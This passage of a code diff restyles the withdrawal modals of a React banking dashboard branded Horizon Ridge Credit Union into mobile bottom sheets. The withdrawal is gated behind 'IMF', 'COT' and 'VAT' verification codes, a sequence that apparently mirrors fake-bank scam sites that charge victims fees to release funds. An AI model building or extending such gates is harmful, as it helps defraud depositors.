+                      Cancel
+                    </button>
+                    <button type="submit"
+                      className="flex-1 py-3 rounded-xl bg-brand-sun text-white font-semibold text-sm shadow-sm hover:bg-brand-navy disabled:opacity-50"
+                    >
+                      Verify OTP
+                    </button>
+                  </div>
+                </form>
+              </div>
             </div>
           </div>
         )}
 
-        {/* Receipt Preview Modal */}
+        {/* Receipt Bottom Sheet */}
         {showReceipt && receiptData && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
-            <div className="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-lg mx-4 overflow-hidden">
-              <div className="p-6">
-                <div className="text-center mb-6">
+          <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
+            <div className="absolute inset-0 bg-black/50" />
+            <div className="relative bg-white dark:bg-gray-900 rounded-t-2xl md:rounded-2xl w-full max-w-lg mx-auto shadow-2xl animate-slide-up max-h-[90vh] overflow-y-auto pb-6 md:pb-4">
+              <div className="flex justify-center pt-3 pb-1">
+                <div className="w-10 h-1 rounded-full bg-gray-300 dark:bg-gray-600" />
+              </div>
+              <div className="px-6 pt-2 pb-4">
+                <div className="text-center mb-5">
                   <div className="w-12 h-12 rounded-full bg-brand-sun/10 flex items-center justify-center mx-auto mb-3">
                     <i className="fa-solid fa-receipt text-brand-sun text-lg" />
                   </div>
                   <h3 className="text-lg font-bold text-gray-900 dark:text-white">Withdrawal Receipt</h3>
-                  <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">{receiptData.receiptId}</p>
+                  <p className="text-[11px] text-gray-500 dark:text-gray-400 mt-0.5">{receiptData.receiptId}</p>
                 </div>
 
-                <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-4 mb-4 text-center">
+                <div className="bg-gray-50 dark:bg-gray-800/60 rounded-xl p-4 mb-4 text-center">
                   <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Amount</p>
                   <p className="text-2xl font-bold text-gray-900 dark:text-white">{fmt(receiptData.amount)}</p>
                   <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">{receiptData.description || "Withdrawal"}</p>
                 </div>
 
-                <div className="grid grid-cols-2 gap-3 text-sm">
+                <div className="grid grid-cols-2 gap-2">
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Status</p>
-                    <p className="font-semibold text-green-600 dark:text-green-400">Pending</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Status</p>
+                    <p className="text-xs font-semibold text-green-600 dark:text-green-400">Pending</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Date</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{receiptData.date}</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Date</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white">{receiptData.date}</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">From</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{profile.full_name}</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">From</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white">{profile.full_name}</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Bank</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{receiptData.bank}</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Bank</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white">{receiptData.bank}</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Account</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{receiptData.accName} ({receiptData.accNum})</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Account</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white truncate">{receiptData.accName} ({receiptData.accNum})</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Bal Before</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{fmt(receiptData.balanceBefore)}</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Bal Before</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white">{fmt(receiptData.balanceBefore)}</p>
                   </div>
                   <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-3 col-span-2">
-                    <p className="text-xs text-gray-500 dark:text-gray-400 mb-1">Bal After</p>
-                    <p className="font-semibold text-gray-900 dark:text-white">{fmt(receiptData.balanceAfter)}</p>
+                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mb-0.5">Bal After</p>
+                    <p className="text-xs font-semibold text-gray-900 dark:text-white">{fmt(receiptData.balanceAfter)}</p>
                   </div>
                 </div>
-              </div>
 
-              <div className="px-6 pb-6 pt-3 border-t border-gray-100 dark:border-gray-700 flex gap-3">
-                <button
-                  onClick={() => {
-                    const win = window.open("", "_blank");
-                    if (win) {
-                      win.document.write(generateReceiptHtml({
-                        amount: receiptData.amount,
-                        description: receiptData.description,
-                        receiptId: receiptData.receiptId,
-                        date: receiptData.date,
-                        bank: receiptData.bank,
-                        accountName: receiptData.accName,
-                        accountNumber: receiptData.accNum,
-                        type: receiptData.type,
-                        balanceBefore: receiptData.balanceBefore,
-                        balanceAfter: receiptData.balanceAfter,
-                        status: "Pending",
-                      }, profile.full_name));
-                      win.document.close();
-                      win.print();
-                    }
-                  }}
-                  className="flex-1 px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 text-sm text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-800 transition-colors"
-                >
-                  <i className="fa-solid fa-print mr-1" /> Print
-                </button>
-                <button
-                  onClick={handleReceiptContinue}
-                  className="flex-1 px-4 py-2 rounded-lg bg-brand-sun text-white font-medium text-sm shadow-sm hover:bg-brand-navy transition-colors"
-                >
-                  Continue <i className="fa-solid fa-arrow-right ml-1" />
-                </button>
+                <div className="flex gap-3 mt-5 pt-3 border-t border-gray-100 dark:border-gray-700">
+                  <button onClick={handleReceiptContinue}
+                    className="flex-1 py-3 rounded-xl bg-brand-sun text-white font-semibold text-sm shadow-sm hover:bg-brand-navy transition-colors"
+                  >
+                    Continue <i className="fa-solid fa-arrow-right ml-1" />
+                  </button>
+                </div>
               </div>
             </div>
           </div>
         )}
 
-        {/* Code Verification Modal */}
+        {/* Code Verification Bottom Sheet */}
         {codeStep && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
-            <div className="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-md mx-4 p-6 relative">
-              <div className="flex items-center gap-2 mb-4">
-                <div className="flex items-center gap-1.5">
-                  <span className={`w-2 h-2 rounded-full ${codeStep === "imf" || codeStep === "cot" || codeStep === "vat" ? "bg-brand-sun" : "bg-gray-300"}`} />
-                  <span className={`w-2 h-2 rounded-full ${codeStep === "cot" || codeStep === "vat" ? "bg-brand-sun" : "bg-gray-300"}`} />
-                  <span className={`w-2 h-2 rounded-full ${codeStep === "vat" ? "bg-brand-sun" : "bg-gray-300"}`} />
-                </div>
-                <span className="text-xs text-gray-500 dark:text-gray-400 ml-auto">
-                  Step {codeStep === "imf" ? "1" : codeStep === "cot" ? "2" : "3"} of 3
-                </span>
+          <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
+            <div className="absolute inset-0 bg-black/50" />
+            <div className="relative bg-white dark:bg-gray-900 rounded-t-2xl md:rounded-2xl w-full max-w-md mx-auto shadow-2xl animate-slide-up pb-6 md:pb-4">
+              <div className="flex justify-center pt-3 pb-1">
+                <div className="w-10 h-1 rounded-full bg-gray-300 dark:bg-gray-600" />
               </div>
-
-              <div className="text-center mb-4">
-                <div className="w-12 h-12 rounded-full bg-brand-navy/10 dark:bg-brand-navy/30 flex items-center justify-center mx-auto mb-3">
-                  <i className="fa-solid fa-shield-halved text-brand-navy dark:text-brand-light text-lg" />
+              <div className="px-6 pt-2 pb-4">
+                <div className="flex items-center gap-2 mb-4">
+                  <div className="flex items-center gap-1">
+                    <span className={`w-2 h-2 rounded-full ${["imf","cot","vat"].includes(codeStep) ? "bg-brand-sun" : "bg-gray-300"}`} />
+                    <span className={`w-2 h-2 rounded-full ${["cot","vat"].includes(codeStep) ? "bg-brand-sun" : "bg-gray-300"}`} />
+                    <span className={`w-2 h-2 rounded-full ${codeStep === "vat" ? "bg-brand-sun" : "bg-gray-300"}`} />
+                  </div>
+                  <span className="text-[10px] text-gray-500 dark:text-gray-400 ml-auto">
+                    Step {codeStep === "imf" ? "1" : codeStep === "cot" ? "2" : "3"} of 3
+                  </span>
                 </div>
-                <h4 className="text-base font-bold text-gray-900 dark:text-white">
-                  {codeStepLabel} Verification
-                </h4>
-                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">{codeStepTitle}</p>
+
+                <div className="text-center mb-4">
+                  <div className="w-12 h-12 rounded-full bg-brand-navy/10 dark:bg-brand-navy/30 flex items-center justify-center mx-auto mb-3">
+                    <i className="fa-solid fa-shield-halved text-brand-navy dark:text-brand-light text-lg" />
+                  </div>
+                  <h4 className="text-base font-bold text-gray-900 dark:text-white">{codeStepLabel} Verification</h4>
+                  <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">{codeStepTitle}</p>
+                </div>
+
+                <form onSubmit={handleCodeSubmit} className="space-y-3">
+                  <div>
+                    <input ref={codeInputRef} type="text" value={code}
+                      onChange={(e) => { setCode(e.target.value.toUpperCase()); setCodeError(null); }}
+                      required placeholder="e.g. AF3K9P2M"
+                      className="block w-full rounded-xl border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-center font-mono tracking-widest text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+                    />
+                    {codeError && <p className="text-xs text-red-500 mt-1">{codeError}</p>}
+                  </div>
+                  <button type="submit" disabled={codeLoading || !code.trim()}
+                    className="w-full py-3 rounded-xl bg-brand-sun text-white font-semibold text-sm shadow-sm hover:bg-brand-navy transition-colors disabled:opacity-50 active:scale-[0.98]"
+                  >
+                    {codeLoading ? <><i className="fa-solid fa-spinner fa-spin mr-1" /> Verifying...</> : <>Verify {codeStepLabel} Code</>}
+                  </button>
+                </form>
               </div>
-
-              <form onSubmit={handleCodeSubmit} className="space-y-3">
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                    Enter {codeStepLabel} Code
-                  </label>
-                  <input
-                    ref={codeInputRef}
-                    type="text"
-                    value={code}
-                    onChange={(e) => {
-                      setCode(e.target.value.toUpperCase());
-                      setCodeError(null);
-                    }}
-                    required
-                    placeholder="e.g. AF3K9P2M"
-                    className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-center font-mono tracking-widest text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
-                  />
-                  {codeError && (
-                    <p className="text-xs text-red-500 mt-1">{codeError}</p>
-                  )}
-                </div>
-
-                <button
-                  type="submit"
-                  disabled={codeLoading || !code.trim()}
-                  className="w-full px-4 py-2 rounded-lg bg-brand-sun text-white font-medium text-sm shadow-sm hover:bg-brand-navy transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  {codeLoading ? (
-                    <><i className="fa-solid fa-spinner fa-spin mr-1" /> Verifying...</>
-                  ) : (
-                    <><i className="fa-solid fa-check mr-1" /> Verify {codeStepLabel} Code</>
-                  )}
-                </button>
-              </form>
-
-              <p className="text-center text-xs text-gray-400 dark:text-gray-500 mt-4">
-                A valid {codeStepLabel} code is required to process this withdrawal.
-              </p>
             </div>
           </div>
         )}
 
         {/* Success Modal */}
         {showSuccess && successData && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
-            <div className="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-md mx-4 p-6 text-center">
-              <div className="w-16 h-16 rounded-full bg-green-100 dark:bg-green-900/30 flex items-center justify-center mx-auto mb-4">
-                <i className="fa-solid fa-circle-check text-green-500 text-2xl" />
+          <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
+            <div className="absolute inset-0 bg-black/50" />
+            <div className="relative bg-white dark:bg-gray-900 rounded-t-2xl md:rounded-2xl w-full max-w-md mx-auto shadow-2xl animate-slide-up pb-6 md:pb-4">
+              <div className="flex justify-center pt-3 pb-1">
+                <div className="w-10 h-1 rounded-full bg-gray-300 dark:bg-gray-600" />
               </div>
-              <h3 className="text-lg font-bold text-gray-900 dark:text-white mb-2">
-                Withdrawal Successful!
-              </h3>
-              <p className="text-sm text-gray-500 dark:text-gray-400 mb-4">
-                Your withdrawal request has been submitted and is pending approval.
-              </p>
+              <div className="px-6 pt-2 pb-4 text-center">
+                <div className="w-16 h-16 rounded-full bg-green-100 dark:bg-green-900/30 flex items-center justify-center mx-auto mb-4">
+                  <i className="fa-solid fa-circle-check text-green-500 text-2xl" />
+                </div>
+                <h3 className="text-lg font-bold text-gray-900 dark:text-white mb-2">Withdrawal Successful!</h3>
+                <p className="text-sm text-gray-500 dark:text-gray-400 mb-4">
+                  Your withdrawal request has been submitted and is pending approval.
+                </p>
 
-              <div className="bg-gray-50 dark:bg-gray-800/60 rounded-lg p-4 mb-4 text-left space-y-2 text-sm">
-                <div className="flex justify-between">
-                  <span className="text-gray-500 dark:text-gray-400">Amount</span>
-                  <span className="font-semibold text-gray-900 dark:text-white">{fmt(successData.amount)}</span>
+                <div className="bg-gray-50 dark:bg-gray-800/60 rounded-xl p-4 mb-4 space-y-2 text-left text-sm">
+                  <div className="flex justify-between">
+                    <span className="text-gray-500 dark:text-gray-400">Amount</span>
+                    <span className="font-semibold text-gray-900 dark:text-white">{fmt(successData.amount)}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-gray-500 dark:text-gray-400">Description</span>
+                    <span className="font-semibold text-gray-900 dark:text-white">{successData.description || "Withdrawal"}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-gray-500 dark:text-gray-400">Receipt</span>
+                    <span className="font-semibold text-gray-900 dark:text-white">{successData.receiptId}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-gray-500 dark:text-gray-400">Date</span>
+                    <span className="font-semibold text-gray-900 dark:text-white">{successData.date}</span>
+                  </div>
                 </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-500 dark:text-gray-400">Description</span>
-                  <span className="font-semibold text-gray-900 dark:text-white">{successData.description || "Withdrawal"}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-500 dark:text-gray-400">Receipt</span>
-                  <span className="font-semibold text-gray-900 dark:text-white">{successData.receiptId}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-500 dark:text-gray-400">Date</span>
-                  <span className="font-semibold text-gray-900 dark:text-white">{successData.date}</span>
-                </div>
-              </div>
 
-              <div className="flex gap-3">
-                <button
-                  onClick={() => {
-                    if (receiptData) {
-                      const win = window.open("", "_blank");
-                      if (win) {
-                        win.document.write(generateReceiptHtml({
-                          amount: successData.amount,
-                          description: successData.description,
-                          receiptId: successData.receiptId,
-                          date: successData.date,
-                          bank: receiptData.bank,
-                          accountName: receiptData.accName,
-                          accountNumber: receiptData.accNum,
-                          type: receiptData.type,
-                          balanceBefore: receiptData.balanceBefore,
-                          balanceAfter: receiptData.balanceAfter,
-                          status: "Pending",
-                        }, profile.full_name));
-                        win.document.close();
-                        win.print();
-                      }
-                    }
-                  }}
-                  className="flex-1 px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 text-sm text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-800"
-                >
-                  <i className="fa-solid fa-print mr-1" /> Print
-                </button>
-                <button
-                  onClick={handleSuccessClose}
-                  className="flex-1 px-4 py-2 rounded-lg bg-brand-sun text-white font-medium text-sm shadow-sm hover:bg-brand-navy"
-                >
-                  Close
-                </button>
+                <div className="flex gap-3">
+                  <button onClick={handleSuccessClose}
+                    className="flex-1 py-3 rounded-xl bg-brand-sun text-white font-semibold text-sm shadow-sm hover:bg-brand-navy transition-colors"
+                  >
+                    Close
+                  </button>
+                </div>
               </div>
             </div>
           </div>
         )}
+
+        <footer className="text-center text-[10px] text-gray-400 dark:text-gray-500 py-4">
+          Copyright &copy; {new Date().getFullYear()} All rights reserved | Horizon Ridge Credit Union.
+        </footer>
       </div>
     </DashboardShell>
   );
